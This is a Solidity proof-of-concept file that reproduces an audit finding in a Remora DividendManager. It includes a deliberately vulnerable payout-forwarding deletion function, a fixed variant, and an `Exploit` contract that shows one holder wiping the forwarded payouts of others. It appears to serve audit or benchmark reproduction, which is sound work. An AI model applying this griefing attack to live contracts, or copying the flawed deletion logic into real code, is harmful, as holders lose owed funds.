// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// =============================================================================
// Synthetic, self-contained reproduction of AuditVault finding 61174
// "A single holder can grief the payouts of all holders forwarding their
//  payouts to the same forwarder" (Remora Pledge / DividendManager).
//
// Mechanism (faithful minimal double):
//   * Holders can nominate a shared `forwardAddress`. Distributions credit the
//     forwarder's accumulated `calculatedPayout`.
//   * Once the forwarder zeroes its token balance it loses `isHolder`, so
//     `payoutBalance(forwarder)` reads 0 even though `calculatedPayout` still
//     holds funds owed to the STILL-forwarding holders.
//   * `_removePayoutForwardAddress` only checks token balance + payoutBalance
//     (both 0) and calls `deleteUser(forwarder)`, wiping `calculatedPayout`.
//     => the forwarded payouts of every other still-forwarding holder are lost.
//
// The VERBATIM vulnerable function is DividendManager._removePayoutForwardAddress
// (the `// @>` line). Everything else is a faithful minimal double.
// =============================================================================

/// @dev Minimal ERC20-ish stablecoin used for claim payouts (the "USDC" side).
contract StableCoin {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Marker token used to record NON-FUND harm (wiped payouts) at the SINK.
contract MiniToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

/// @dev Faithful minimal double of Remora's DividendManager. Admin-driven
///      (functions take explicit actor addresses) so a single Exploit contract
///      can play every holder without cheatcodes.
contract DividendManager {
    struct HolderStatus {
        bool isHolder;
        uint64 calculatedPayout; // accumulated payout owed (incl. forwarded)
    }

    mapping(address => HolderStatus) internal _holderStatus;
    mapping(address => uint256) public tokenBalanceOf;
    mapping(address => address) public forwardAddress;

    // measurement-only: how much a source holder forwarded into a non-holder's
    // calculatedPayout accumulator (i.e. the amount at risk of being wiped).
    mapping(address => uint256) public contribToCalcPayout;

    address[] internal holders;
    StableCoin internal immutable stable;

    constructor(StableCoin _stable) {
        stable = _stable;
    }

    // ----------------------------- views -----------------------------------
    function balanceOf(address user) public view returns (uint256) {
        return tokenBalanceOf[user];
    }

    /// @dev Claimable balance: only surfaces for accounts that are holders.
    ///      A non-holder forwarder reads 0 here even while calculatedPayout > 0.
    function payoutBalance(address user) public view returns (uint256) {
        return _holderStatus[user].isHolder ? _holderStatus[user].calculatedPayout : 0;
    }

    function getCalculatedPayout(address user) external view returns (uint64) {
        return _holderStatus[user].calculatedPayout;
    }

    function getHolderStatus(address user) external view returns (bool) {
        return _holderStatus[user].isHolder;
    }

    // --------------------------- mutations ----------------------------------
    function mintTokens(address to, uint256 amount) external {
        tokenBalanceOf[to] += amount;
        if (!_holderStatus[to].isHolder) {
            _holderStatus[to].isHolder = true;
            holders.push(to);
        }
    }

    function setPayoutForwardAddress(address holder, address forwarder) external {
        forwardAddress[holder] = forwarder;
    }

    /// @dev Distribute `amount` pro-rata by token balance, routing each holder's
    ///      share to its forward target (or itself if none).
    function fundPayout(uint64 amount) external {
        uint256 total = _totalSupply();
        uint256 n = holders.length;
        for (uint256 i = 0; i < n; ++i) {
            address h = holders[i];
            uint256 bal = tokenBalanceOf[h];
            if (bal == 0) continue;
            uint256 share = (uint256(amount) * bal) / total;
            address target = forwardAddress[h] == address(0) ? h : forwardAddress[h];
            _holderStatus[target].calculatedPayout += uint64(share);
            if (!_holderStatus[target].isHolder) {
                // forwarded into a non-holder's accumulator: at risk of a wipe
                contribToCalcPayout[h] += share;
            }
            stable.mint(address(this), share); // fund the distribution
        }
    }

    /// @dev Holder claims accumulated payout in stablecoin (requires isHolder).
    function claimPayout(address holder) external {
        require(_holderStatus[holder].isHolder, "not holder");
        uint256 amt = _holderStatus[holder].calculatedPayout;
        _holderStatus[holder].calculatedPayout = 0;
        stable.transfer(holder, amt);
    }

    function transferToken(address from, address to, uint256 amount) external {
        tokenBalanceOf[from] -= amount;
        tokenBalanceOf[to] += amount;
        if (tokenBalanceOf[from] == 0) {
            _holderStatus[from].isHolder = false; // forwarder loses holder status
        }
        if (!_holderStatus[to].isHolder) {
            _holderStatus[to].isHolder = true;
            holders.push(to);
        }
    }

    function removePayoutForwardAddress(address holder) external {
        _removePayoutForwardAddress(holder, forwardAddress[holder]);
        forwardAddress[holder] = address(0);
    }

    /// @dev Removes a stored user, deleting ALL of its state including any
    ///      accumulated `calculatedPayout` owed to still-forwarding holders.
    function deleteUser(address user) internal {
        delete _holderStatus[user];
    }

    // ----------------------- VULNERABLE FUNCTION ----------------------------
    function _removePayoutForwardAddress(address holder, address forwardedAddress) internal virtual {
        holder; // silence unused-var warning; faithful to original signature
        if (forwardedAddress != address(0)) {
            if (
                balanceOf(forwardedAddress) == 0 &&
                payoutBalance(forwardedAddress) == 0
            ) deleteUser(forwardedAddress); // @> wipes forwarder.calculatedPayout still owed to other holders
        }
    }

    function _totalSupply() internal view returns (uint256 total) {
        uint256 n = holders.length;
        for (uint256 i = 0; i < n; ++i) {
            total += tokenBalanceOf[holders[i]];
        }
    }
}

/// @dev Fixed variant: also require calculatedPayout == 0 before deleting the
///      user, so forwarded payouts owed to others are never wiped.
contract DividendManagerFixed is DividendManager {
    constructor(StableCoin _stable) DividendManager(_stable) {}

    function _removePayoutForwardAddress(address holder, address forwardedAddress) internal override {
        holder;
        if (forwardedAddress != address(0)) {
            if (
                balanceOf(forwardedAddress) == 0 &&
                payoutBalance(forwardedAddress) == 0 &&
                _holderStatus[forwardedAddress].calculatedPayout == 0
            ) deleteUser(forwardedAddress);
        }
    }
}

/// @dev Orchestrates the grief attack from the finding's PoC
///      (test_holderForcesForwarderToLosePayouts).
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    // still-forwarding victim holder (user1) and the shared forwarder.
    address internal constant VICTIM = 0x2222222222222222222222222222222222222222;
    address internal constant FORWARDER = 0x3333333333333333333333333333333333333333;

    uint64 internal constant DIST = 100e6; // per-distribution total payout

    // exposed results for the driver to assert real numbers
    uint256 public totalWiped;     // total calculatedPayout wiped from forwarder
    uint256 public victimLoss;     // portion belonging to still-forwarding user1
    uint256 public victimLossFixed;
    address public markerToken;

    function run() external payable {
        // create EVERY helper up-front, unconditionally, in a fixed order.
        StableCoin sc = new StableCoin();
        DividendManager mgr = new DividendManager(sc);
        MiniToken marker = new MiniToken();

        (uint256 tw, uint256 vl) = _scenario(mgr, sc);
        totalWiped = tw;
        victimLoss = vl;

        // NON-FUND harm: mint the wiped forwarded payout owed to the
        // still-forwarding victim to the SINK as a marker of loss.
        marker.mint(SINK, vl);
        markerToken = address(marker);
    }

    /// @dev Control path: same attack inputs against the fixed manager.
    function runFixed() external {
        StableCoin sc = new StableCoin();
        DividendManagerFixed mgr = new DividendManagerFixed(sc);
        (, uint256 vl) = _scenario(mgr, sc);
        victimLossFixed = vl;
    }

    function _scenario(DividendManager mgr, StableCoin) internal returns (uint256 wiped, uint256 loss) {
        // 1. holdings: victim=8, attacker(user2)=1, forwarder=1  (total 10)
        mgr.mintTokens(VICTIM, 8);
        mgr.mintTokens(ATTACKER, 1);
        mgr.mintTokens(FORWARDER, 1);

        // 2. both users forward to the same forwarder (still a holder here)
        mgr.setPayoutForwardAddress(VICTIM, FORWARDER);
        mgr.setPayoutForwardAddress(ATTACKER, FORWARDER);

        // 3. phase 1: 5 distributions credit the forwarder's payoutBalance
        for (uint256 i = 0; i < 5; ++i) mgr.fundPayout(DIST);

        // 4. forwarder claims everything (calculatedPayout -> 0)
        mgr.claimPayout(FORWARDER);

        // 5. forwarder zeroes its token balance -> loses isHolder
        mgr.transferToken(FORWARDER, ATTACKER, mgr.balanceOf(FORWARDER));

        // 6. phase 2: 5 distributions now accrue into forwarder.calculatedPayout
        //    (forwarder is a non-holder, so payoutBalance(forwarder) stays 0)
        for (uint256 i = 0; i < 5; ++i) mgr.fundPayout(DIST);

        uint256 calcBefore = mgr.getCalculatedPayout(FORWARDER); // 500e6
        loss = mgr.contribToCalcPayout(VICTIM);                  // 400e6 (still forwarding)

        // 7. a single holder (attacker/user2) removes the forwarder -> deleteUser
        mgr.removePayoutForwardAddress(ATTACKER);

        uint256 calcAfter = mgr.getCalculatedPayout(FORWARDER);  // 0 if buggy
        wiped = calcBefore - calcAfter;
        if (calcAfter != 0) loss = 0; // fixed: nothing wiped, victim unharmed
    }
}
